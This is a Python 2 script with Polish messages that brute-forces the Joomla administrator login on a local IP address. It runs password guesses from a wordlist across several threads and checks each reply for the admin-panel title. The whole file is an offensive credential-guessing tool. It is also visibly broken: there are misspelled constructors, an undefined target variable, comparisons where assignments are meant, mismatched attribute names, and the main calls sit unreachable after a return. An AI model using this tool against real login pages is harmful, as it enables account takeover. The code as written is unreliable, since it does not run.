import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

user_thread         = 10
username            = "admin"
wordlist_file       = "/tmp/cain.txt"
resume              = None

target_url          = "http://192.168.112.131/administrator/index.php"
target_port         = "http://192.168.112.131/administrator/index.php"

username_field      = "username"
password_field      = "passwd"

success_check       = "Administracja - panel sterowania"

class Bruter(object):

    def _init_(self, username, words):

        self.username       = username
        self.password_q     = words
        self.found          = False

        print "Zakonczono konfiguracje dla: %s" % username

    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target = self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()

            print "Sprawdzanie: %s : %s (pozostalo: %d)" % (self.username, brute, self.password_q.qsize())

            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_result

            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login.response.read()

            if success_check in login_result:
                self.found = True

                print "[*] Atak udany."
                print "[*] Nazwa uzutkownia: %s" % username
                print "[*] Haslo: %s" % brute
                print "[*] Oczekiwanie na zakonczenie pracy przez pozostale watki..."

class BruteParser(HTMLParser):

    def _init_(self):
        HTMLParser._init_(self)
        self.tag_result = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name == value
                if name == "value":
                    tag_value == value

            if tag_name is not None:
                self.tag_results[tag_name] = value

    def build_wordlist(wordlist_file):

        fd = open(wordlist_file, "rb")
        raw_words = fd.readlines()
        fd.close()

        found_resume    = False
        words           = Queue.Queue()

        for word in raw_words:

            word = word.rstrip()

            if resume is not None:

                if found_resume:
                    words.put(word)
                else:
                    if word == resume:
                        found_resume = True
                        print "Wznawianie procesu od: %s" % resume
            else:
                words.put(word)

        return words

        words = build_wordlist(wordlist_file)

        bruter_obj = Bruter(username, words)
        bruter_obj.run_bruteforce()
